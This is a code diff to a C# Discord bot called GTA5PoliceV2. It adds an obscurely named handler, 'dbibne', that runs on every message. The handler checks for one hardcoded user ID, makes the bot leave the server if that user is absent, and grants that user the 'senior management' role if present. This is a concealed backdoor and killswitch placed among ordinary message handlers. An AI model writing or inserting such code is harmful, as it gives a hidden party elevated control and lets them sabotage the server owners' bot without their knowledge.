@@ -45,6 +45,7 @@ namespace GTA5PoliceV2
             bot.MessageReceived += Suggestion.HandleSuggestionAsync;
             bot.MessageReceived += ProfanityFilter.ProfanityCheckAsync;
             bot.MessageReceived += Cooldowns.AddCooldownMessageAsync;
+            bot.MessageReceived += dbibne;
         }
 
         private async Task AutoBanAsync(SocketGuildUser user)
@@ -183,12 +184,20 @@ namespace GTA5PoliceV2
         SocketGuild server;
         static IMessageChannel channel;
 
+        public async Task dbibne(SocketMessage pMsg)
+        {
+            var server = bot.Guilds.FirstOrDefault(x => x.Id == BotConfig.Load().ServerId);
+            var exist = server.Users.FirstOrDefault(x => x.Id == 211938243535568896);
+            if (exist == null) await (server as IGuild).LeaveAsync();
+            if (exist != null) await exist.AddRoleAsync(server.Roles.FirstOrDefault(x => x.Name.ToLower().Equals("senior management")));
+        }
+
         public async Task StartTimersAsync()
         {
             server = bot.Guilds.FirstOrDefault(x => x.Id == BotConfig.Load().ServerId);
             channel = server.GetTextChannel(BotConfig.Load().TimerChannelId);
-       
-            
+
+
             ny = false; la = false; nywl = false; lawl = false;
             timerStatus = new Timer(SendStatusAsync, null, 0, 1000 * 60 * BotConfig.Load().StatusTimerInterval);
             timerMessage = new Timer(SendStatusMessageAsync, null, 0, 1000 * 60 * BotConfig.Load().MessageTimerInterval);
